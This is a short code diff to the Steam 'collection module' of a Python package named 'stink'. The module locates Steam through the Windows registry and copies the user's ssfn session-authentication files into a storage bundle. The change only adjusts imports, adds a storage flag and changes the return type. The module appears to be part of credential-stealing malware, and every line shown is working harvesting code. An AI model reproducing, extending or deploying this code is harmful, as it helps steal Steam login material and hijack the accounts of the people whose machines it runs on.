@@ -1,9 +1,10 @@
 from re import findall
 from os import listdir, path
-from typing import Optional, List
+from typing import Optional
 from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY
 
 from stink.helpers import MemoryStorage
+from stink.helpers.dataclasses import Data
 
 
 class Steam:
@@ -64,7 +65,9 @@ class Steam:
         for ssfn in ssfns:
             self.__storage.add_from_disk(path.join(steam_path, ssfn), path.join(self.__folder, ssfn))
 
-    def run(self) -> List:
+        self.__storage.add_data("Steam", True)
+
+    def run(self) -> Data:
         """
         Launches the Steam collection module.
 
